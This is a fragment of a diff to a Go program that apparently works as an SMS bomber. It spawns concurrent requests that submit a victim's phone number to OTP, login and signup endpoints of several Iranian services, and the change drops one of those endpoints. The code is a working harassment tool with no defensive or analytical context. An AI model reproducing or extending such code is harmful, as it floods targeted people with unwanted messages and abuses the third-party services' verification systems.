@@ -375,9 +375,6 @@ func main() {
 		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
-			"contact": phone,
-		}, ch) // just check
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
 		}, ch)  // edit :4/22/2025
